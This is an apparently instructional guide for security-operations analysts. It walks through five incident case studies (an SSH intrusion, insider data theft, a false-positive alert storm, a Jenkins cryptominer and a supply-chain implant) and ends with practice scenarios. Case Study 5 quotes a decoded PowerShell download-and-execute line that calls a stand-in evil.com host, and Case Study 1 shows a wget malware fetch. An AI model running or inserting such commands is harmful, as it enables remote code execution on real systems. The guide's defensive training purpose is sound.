# 🌍 Real-World Security Incidents - Learn from Actual Cases

These are based on real incidents (details changed for privacy). Learn how to spot and handle similar situations.

---

## 📚 Case Study 1: The Midnight SSH Attack

### The Alert
**Time:** Tuesday, 2:34 AM
**Alert:** 🔴 CRITICAL - Unauthorized SSH Access

```
Source IP: 185.234.218.44 (Russia)
Target: web-server-prod-01
User: root
Status: SUCCESS
```

### 🔍 Investigation Steps

**2:35 AM - Analyst Sarah's Response:**

1. **First Reaction:**
   "SSH from Russia? We don't have any Russian offices. This is bad."

2. **Quick Checks:**
   ```bash
   # Check who's currently logged in
   w

   # Output showed:
   root     pts/0    185.234.218.44   02:34   0.00s  wget malware.sh
   ```

   **RED FLAG!** They're downloading malware!

3. **Immediate Action:**
   ```bash
   # Block the IP immediately
   iptables -A INPUT -s 185.234.218.44 -j DROP

   # Kill their session
   pkill -u root -t pts/0

   # Disable root SSH access
   echo "PermitRootLogin no" >> /etc/ssh/sshd_config
   systemctl restart sshd
   ```

### 📊 What They Found

The attacker had:
- ✅ Used a leaked password from a data breach
- ✅ Installed cryptocurrency mining software
- ✅ Created a backdoor account named "support"
- ✅ Been active for only 3 minutes before detection

### 💡 Lessons Learned

1. **Never allow root SSH access** - Use sudo instead
2. **Monitor for wget/curl to suspicious domains**
3. **2FA would have prevented this entirely**
4. **Quick response limited damage** - 3 minutes vs potential hours

### ✅ Outcome
- Incident contained in 5 minutes
- No data stolen (confirmed via network logs)
- Password policies updated company-wide
- 2FA implemented next day

---

## 📚 Case Study 2: The Inside Job

### The Alert
**Time:** Thursday, 11:45 AM
**Alert:** 🟠 HIGH - Suspicious Data Transfer

```
User: bob.smith (Accounting)
Source: accounting-ws-05
Destination: dropbox.com
Size: 847 MB
Files: Multiple .xlsx files
```

### 🔍 Investigation Steps

**11:50 AM - Analyst Mike's Response:**

1. **Context Gathering:**
   - Bob doesn't normally use Dropbox
   - 847 MB is huge for Excel files
   - Check Bob's recent activity

2. **User Activity Review:**
   ```spl
   index=security user="bob.smith" earliest=-7d
   | stats count by action
   ```

   **Found:**
   - Accessed HR database (not his department!)
   - Copied salary information
   - Unusual login times (very early morning)

3. **Correlation Check:**
   - Bob gave notice last week
   - Joining competitor next month
   - Downloaded customer list yesterday

### 🚨 Escalation

**This is theft of trade secrets!**

Actions taken:
1. Preserved evidence (screenshots, logs)
2. Blocked Dropbox upload mid-transfer
3. Called Legal and HR immediately
4. Disabled Bob's accounts
5. Escorted from building

### 📊 What Really Happened

Bob was stealing:
- Complete customer database
- All employee salary information
- Product roadmap documents
- Vendor contracts

**Total value:** Estimated $2M in competitive advantage

### 💡 Lessons Learned

1. **Monitor departing employees closely**
2. **Alert on access to non-job-related data**
3. **Block personal cloud storage sites**
4. **Reduce access immediately upon resignation**

### ✅ Outcome
- Data theft prevented (only 12% uploaded)
- Legal action taken against employee
- DLP (Data Loss Prevention) system implemented
- New offboarding procedures created

---

## 📚 Case Study 3: The False Positive Fiasco

### The Alert
**Time:** Monday, 9:15 AM
**Alert:** 🔴 CRITICAL - Multiple System Compromise

```
ALERT STORM!
- 47 Unauthorized SSH alerts
- 23 Port scanning alerts
- 15 Privilege escalation alerts
All from IP: 10.0.50.100
```

### 🔍 Investigation Steps

**9:16 AM - Analyst Tom's Response:**

1. **Initial Panic:**
   "Oh no, massive attack in progress!"

2. **Deep Breath and Investigation:**
   ```bash
   # What is 10.0.50.100?
   nslookup 10.0.50.100
   # Result: vulnerability-scanner.internal.com
   ```

3. **Checking the Calendar:**
   - Monthly vulnerability scan scheduled for 9 AM
   - IT forgot to notify SOC team
   - Scanner using new IP address

### 😅 What Really Happened

- Scheduled security scan
- New scanner IP not in whitelist
- IT team forgot to update SOC
- 85 false alerts in 15 minutes

### 💡 Lessons Learned

1. **Always check scan schedules first**
2. **Maintain scanner IP whitelist**
3. **Require IT to notify before scans**
4. **Don't panic - investigate first**

### ✅ Outcome
- Added scanner to whitelist
- Created shared calendar for all scans
- Documented for future analysts
- Good practice for real incident!

---

## 📚 Case Study 4: The Cryptominer

### The Alert
**Time:** Friday, 4:45 PM (Of course!)
**Alert:** 🟡 MEDIUM - Unusual Process Execution

```
Host: jenkins-build-03
Process: /tmp/.hidden/xmrig
CPU Usage: 95%
Network: Connecting to pool.minexmr.com
```

### 🔍 Investigation Steps

**4:50 PM - Analyst Lisa's Response:**

1. **Process Identification:**
   ```bash
   # What is xmrig?
   Google: "xmrig process"
   # Result: Cryptocurrency mining software!
   ```

2. **How did it get there?**
   - Jenkins server exposed to internet
   - Unpatched vulnerability (CVE-2019-1003000)
   - Automated exploit from botnet

3. **Extent of Compromise:**
   ```bash
   # Check all Jenkins servers
   for server in jenkins-{01..10}; do
     ssh $server "ps aux | grep xmrig"
   done
   # Found on 3 servers!
   ```

### 📊 Damage Assessment

- 3 servers mining cryptocurrency
- Running for ~2 weeks undetected
- Estimated $400 in electricity costs
- Jenkins performance degraded 60%
- No data theft (only mining)

### 🔧 Remediation

1. Killed mining processes
2. Removed malware files
3. Patched Jenkins immediately
4. Moved Jenkins behind VPN
5. Added CPU monitoring alerts

### 💡 Lessons Learned

1. **Patch management is critical**
2. **Monitor CPU usage spikes**
3. **Don't expose build servers to internet**
4. **Check for hidden directories in /tmp**

### ✅ Outcome
- All miners removed
- Jenkins fully patched
- New monitoring for mining pools
- CPU alerts implemented

---

## 📚 Case Study 5: The Supply Chain Attack

### The Alert
**Time:** Wednesday, 10:30 AM
**Alert:** 🟠 HIGH - New Scheduled Task Created

```
Host: accounting-01
Task Name: "Windows Update Helper"
Action: powershell -enc [base64 data]
Schedule: Every 60 minutes
```

### 🔍 Investigation Steps

1. **Decode the PowerShell:**
   ```powershell
   # Decoded:
   IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')
   ```

   **This downloads and runs malware!**

2. **Source Investigation:**
   - Recently installed "Invoice Processing Software"
   - Software from small vendor
   - Vendor was compromised last month

3. **Spread Assessment:**
   - 15 machines have this software
   - 8 showing similar scheduled tasks
   - All connecting to same C2 server

### 🚨 Major Incident Response

1. **Containment:**
   - Isolated all affected machines
   - Blocked C2 domain at firewall
   - Disabled scheduled tasks

2. **Eradication:**
   - Removed malicious software
   - Cleaned scheduled tasks
   - Full antivirus scans

3. **Recovery:**
   - Restored from clean backups
   - Reinstalled software (clean version)
   - Enhanced monitoring

### 💡 Lessons Learned

1. **Vet all third-party software**
2. **Monitor scheduled task creation**
3. **Isolate high-risk software**
4. **Maintain software inventory**

### ✅ Outcome
- Attack stopped before data theft
- Vendor relationship reviewed
- New software approval process
- Supply chain security program started

---

## 🎯 Common Patterns to Remember

### Attack Patterns
1. **Timing:** Attacks often happen nights/weekends
2. **Persistence:** Attackers create multiple backdoors
3. **Lateral Movement:** Rarely stop at one system
4. **Data Staging:** Look for collection before exfiltration

### Investigation Patterns
1. **Check the obvious first** (scheduled scans, maintenance)
2. **Correlate multiple alerts** (rarely isolated events)
3. **Look at timing** (business hours vs off-hours)
4. **Consider insider threats** (especially departing employees)

### False Positive Patterns
1. **Scheduled scans** without notification
2. **New software deployments**
3. **Developer testing** in production
4. **Cloud service IP changes**

---

## 📝 Your Turn: Practice Scenarios

### Scenario 1: You See This Alert
```
Time: Saturday 3 AM
Alert: Failed Authentication Spike
User: admin
Attempts: 1,247
Source: 192.168.1.100 (Internal)
```

**Questions:**
1. What would you check first?
2. Is internal source good or bad?
3. What might cause 1,247 attempts?

**Answer:** Check if it's a misconfigured application with wrong password in config file

### Scenario 2: You See This Alert
```
Time: Tuesday 2 PM
Alert: Large Data Transfer
User: susan.marketing
Destination: google.com
Size: 2.3 GB
```

**Questions:**
1. Is this suspicious?
2. What context do you need?
3. How would you investigate?

**Answer:** Could be legitimate Google Drive backup - check if Marketing uses Google Workspace

---

## 💡 Key Takeaways

1. **Context is everything** - Same alert can be attack or false positive
2. **Speed matters** - Fast response limits damage
3. **Document everything** - Future you needs those notes
4. **Trust but verify** - Even internal sources can be compromised
5. **Learn from each incident** - Every case teaches something new

---

**Remember:** Every expert was once a beginner who investigated their first alert. You're building these same skills every day! 🚀